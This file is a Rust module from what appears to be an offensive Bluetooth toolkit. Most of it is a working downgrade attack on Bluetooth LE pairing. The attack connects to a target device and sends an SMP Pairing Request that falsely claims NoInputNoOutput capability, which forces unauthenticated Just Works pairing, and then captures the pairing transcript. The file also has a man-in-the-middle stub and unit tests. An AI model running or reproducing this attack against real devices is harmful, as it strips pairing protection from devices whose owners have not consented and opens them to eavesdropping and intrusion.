//! SMP (Security Manager Protocol) attack workers.
//!
//! - `run_downgrade`: forces Just Works pairing via NoInputNoOutput IO capability
//! - `run_mitm`: MITM relay framework stub

use std::time::Instant;

use super::hci::{parse_bdaddr, HciCommand, HciSocket};
use super::{BtAttackResult, BtAttackType, BtCapture};

// HCI OGF for LE Controller commands
const OGF_LE: u8 = 0x08;

// HCI LE opcodes
const LE_CREATE_CONNECTION: u16 = 0x0D;

/// SMP downgrade attack: initiate an LE connection with NoInputNoOutput
/// IO capability to force Just Works pairing (no MITM protection).
///
/// Full flow:
///   1. Send HCI_LE_Create_Connection (OGF 0x08, OCF 0x0D)
///   2. Wait for LE Connection Complete event (subevent 0x01)
///   3. Parse connection status (byte 0 must be 0x00)
///   4. Open L2CAP SMP fixed channel (CID 0x0006)
///   5. Send SMP Pairing Request with NoInputNoOutput IO capability
///   6. Receive SMP Pairing Response
///   7. Return transcript as BtCapture::PairingTranscript
pub fn run_downgrade(hci: &HciSocket, target_addr: &str, addr_type: u8) -> BtAttackResult {
    let start = Instant::now();
    log::info!("smp_downgrade: targeting {} (addr_type={})", target_addr, addr_type);

    // Step 1: Send HCI_LE_Create_Connection (OGF 0x08, OCF 0x0D)
    let bdaddr = parse_bdaddr(target_addr);

    // Build HCI_LE_Create_Connection command parameters:
    //   scan_interval(2) + scan_window(2) + filter_policy(1) +
    //   peer_addr_type(1) + peer_addr(6) + own_addr_type(1) +
    //   conn_interval_min(2) + conn_interval_max(2) + conn_latency(2) +
    //   supervision_timeout(2) + min_ce_length(2) + max_ce_length(2)
    // HCI peer_addr_type: 0x00 = public, 0x01 = random
    let hci_addr_type = if addr_type == 2 { 0x01 } else { 0x00 };
    let mut params = Vec::with_capacity(25);
    params.extend_from_slice(&0x0060u16.to_le_bytes()); // scan_interval: 60ms
    params.extend_from_slice(&0x0030u16.to_le_bytes()); // scan_window: 30ms
    params.push(0x00); // filter_policy: no whitelist
    params.push(hci_addr_type); // peer_addr_type from discovery
    params.extend_from_slice(&bdaddr); // peer address
    params.push(0x00); // own_addr_type: public
    params.extend_from_slice(&0x0018u16.to_le_bytes()); // conn_interval_min: 30ms
    params.extend_from_slice(&0x0028u16.to_le_bytes()); // conn_interval_max: 50ms
    params.extend_from_slice(&0x0000u16.to_le_bytes()); // conn_latency: 0
    params.extend_from_slice(&0x00C8u16.to_le_bytes()); // supervision_timeout: 2s
    params.extend_from_slice(&0x0000u16.to_le_bytes()); // min_ce_length: 0
    params.extend_from_slice(&0x0000u16.to_le_bytes()); // max_ce_length: 0

    let cmd = HciCommand::new(OGF_LE, LE_CREATE_CONNECTION, params);
    if let Err(e) = hci.send_command(&cmd) {
        log::info!("smp_downgrade: LE_Create_Connection send failed: {}", e);
        return BtAttackResult {
            attack_type: BtAttackType::SmpDowngrade,
            target_address: target_addr.to_string(),
            target_name: None,
            success: false,
            capture: None,
            error: Some(format!("LE_Create_Connection failed: {}", e)),
            timestamp: start,
        };
    }

    // Step 2: Wait for LE Connection Complete event (subevent 0x01)
    let conn_event = match hci.wait_le_event(0x01, 5000) {
        Ok(data) => data,
        Err(e) => {
            log::info!("smp_downgrade: wait LE Connection Complete failed: {}", e);
            return BtAttackResult {
                attack_type: BtAttackType::SmpDowngrade,
                target_address: target_addr.to_string(),
                target_name: None,
                success: false,
                capture: None,
                error: Some(format!("LE Connection Complete timeout: {}", e)),
                timestamp: start,
            };
        }
    };

    // Step 3: Parse connection status — byte 0 must be 0x00 (success)
    let conn_status = conn_event.first().copied().unwrap_or(0xFF);
    if conn_status != 0x00 {
        log::info!("smp_downgrade: LE connection rejected, status=0x{:02X}", conn_status);
        return BtAttackResult {
            attack_type: BtAttackType::SmpDowngrade,
            target_address: target_addr.to_string(),
            target_name: None,
            success: false,
            capture: None,
            error: Some(format!("LE connection failed, HCI status 0x{:02X}", conn_status)),
            timestamp: start,
        };
    }
    log::info!("smp_downgrade: LE connection established");

    // Step 4: Open L2CAP SMP fixed channel (CID 0x0006, LE public, PSM 1)
    let l2cap = match super::l2cap_socket::L2capSocket::connect(target_addr, addr_type, 0, 0x0006) {
        Ok(sock) => sock,
        Err(e) => {
            log::info!("smp_downgrade: L2CAP SMP connect failed: {}", e);
            return BtAttackResult {
                attack_type: BtAttackType::SmpDowngrade,
                target_address: target_addr.to_string(),
                target_name: None,
                success: false,
                capture: None,
                error: Some(format!("L2CAP SMP connect failed: {}", e)),
                timestamp: start,
            };
        }
    };

    // Step 5: Send SMP Pairing Request with NoInputNoOutput IO capability
    //   0x01 = Pairing Request opcode
    //   0x03 = IO Capability: NoInputNoOutput
    //   0x00 = OOB data flag: no OOB
    //   0x01 = AuthReq: Bonding
    //   0x10 = Max Encryption Key Size: 16
    //   0x00 = Initiator Key Distribution: none
    //   0x00 = Responder Key Distribution: none
    let pairing_req: [u8; 7] = [0x01, 0x03, 0x00, 0x01, 0x10, 0x00, 0x00];
    if let Err(e) = l2cap.send(&pairing_req) {
        log::info!("smp_downgrade: SMP Pairing Request send failed: {}", e);
        return BtAttackResult {
            attack_type: BtAttackType::SmpDowngrade,
            target_address: target_addr.to_string(),
            target_name: None,
            success: false,
            capture: None,
            error: Some(format!("SMP Pairing Request send failed: {}", e)),
            timestamp: start,
        };
    }
    log::info!("smp_downgrade: SMP Pairing Request sent");

    // Step 6: Receive SMP Pairing Response
    let mut resp_buf = [0u8; 64];
    let n = match l2cap.recv(&mut resp_buf, 5000) {
        Ok(n) => n,
        Err(e) => {
            log::info!("smp_downgrade: SMP Pairing Response recv failed: {}", e);
            return BtAttackResult {
                attack_type: BtAttackType::SmpDowngrade,
                target_address: target_addr.to_string(),
                target_name: None,
                success: false,
                capture: None,
                error: Some(format!("SMP Pairing Response recv failed: {}", e)),
                timestamp: start,
            };
        }
    };
    log::info!("smp_downgrade: SMP Pairing Response received ({} bytes)", n);

    // Step 7: Build transcript and return as PairingTranscript
    let mut transcript = Vec::with_capacity(pairing_req.len() + n);
    transcript.extend_from_slice(&pairing_req);
    transcript.extend_from_slice(&resp_buf[..n]);

    BtAttackResult {
        attack_type: BtAttackType::SmpDowngrade,
        target_address: target_addr.to_string(),
        target_name: None,
        success: true,
        capture: Some(BtCapture::PairingTranscript {
            address: target_addr.to_string(),
            data: transcript,
        }),
        error: None,
        timestamp: start,
    }
}

/// SMP MITM relay — framework stub.
///
/// A real MITM relay requires two BT adapters and real-time forwarding
/// of SMP messages. This returns an error indicating it is a framework only.
pub fn run_mitm(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
    let start = Instant::now();
    let _ = hci; // acknowledge parameter
    log::info!("smp_mitm: framework stub for {}", target_addr);

    BtAttackResult {
        attack_type: BtAttackType::SmpMitm,
        target_address: target_addr.to_string(),
        target_name: None,
        success: false,
        capture: None,
        error: Some(
            "SMP MITM requires two BT adapters for relay. Pi Zero 2W has one BCM43430B0. \
             Hardware-limited — not achievable with current setup."
                .into(),
        ),
        timestamp: start,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_bdaddr() {
        let addr = parse_bdaddr("AA:BB:CC:DD:EE:FF");
        // Reversed for HCI LE: FF EE DD CC BB AA
        assert_eq!(addr, [0xFF, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA]);
    }

    #[test]
    fn test_parse_bdaddr_invalid() {
        let addr = parse_bdaddr("not-an-address");
        assert_eq!(addr, [0; 6]);
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_run_downgrade_stub() {
        let hci = HciSocket::open(0).unwrap();
        let result = run_downgrade(&hci, "AA:BB:CC:DD:EE:FF", 1);
        assert_eq!(result.attack_type, BtAttackType::SmpDowngrade);
        assert!(result.success);
        assert!(result.capture.is_some());
        match &result.capture {
            Some(BtCapture::PairingTranscript { address, data }) => {
                assert_eq!(address, "AA:BB:CC:DD:EE:FF");
                assert!(!data.is_empty());
            }
            _ => panic!("Expected PairingTranscript capture"),
        }
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_run_mitm_stub() {
        let hci = HciSocket::open(0).unwrap();
        let result = run_mitm(&hci, "AA:BB:CC:DD:EE:FF");
        assert_eq!(result.attack_type, BtAttackType::SmpMitm);
        assert!(!result.success);
        assert!(result.error.as_deref().unwrap().contains("Hardware-limited"));
    }
}
